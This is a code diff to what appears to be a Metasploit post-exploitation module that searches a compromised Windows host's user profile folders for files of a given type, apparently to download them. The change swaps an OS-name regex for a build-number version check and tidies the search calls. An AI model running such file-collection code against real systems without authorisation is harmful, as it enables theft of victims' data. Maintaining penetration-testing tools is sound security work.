@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::FileSystem
+  include Msf::Post::Windows::Version
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -29,7 +30,6 @@ class MetasploitModule < Msf::Post
               stdapi_fs_search
               stdapi_railgun_api
               stdapi_sys_config_getenv
-              stdapi_sys_config_sysinfo
             ]
           }
         }
@@ -46,21 +46,21 @@ class MetasploitModule < Msf::Post
 
   def download_files(location, file_type)
     sysdriv = client.sys.config.getenv('SYSTEMDRIVE')
-    sysnfo = client.sys.config.sysinfo['OS']
     profile_path_old = sysdriv + '\\Documents and Settings\\'
     profile_path_new = sysdriv + '\\Users\\'
 
+    version = get_version_info
     if location
       print_status("Searching #{location}")
-      getfile = client.fs.file.search(location, file_type, recurse = true, timeout = -1)
+      getfile = client.fs.file.search(location, file_type, true, -1)
 
-    elsif sysnfo =~ /(Windows XP|2003|.NET)/
+    elsif version.build_number < Msf::WindowsVersion::Vista_SP0
       print_status("Searching #{profile_path_old} through windows user profile structure")
-      getfile = client.fs.file.search(profile_path_old, file_type, recurse = true, timeout = -1)
+      getfile = client.fs.file.search(profile_path_old, file_type, true, -1)
     else
       # For systems such as: Windows 7|Windows Vista|2008
       print_status("Searching #{profile_path_new} through windows user profile structure")
-      getfile = client.fs.file.search(profile_path_new, file_type, recurse = true, timeout = -1)
+      getfile = client.fs.file.search(profile_path_new, file_type, true, -1)
     end
 
     getfile.each do |file|
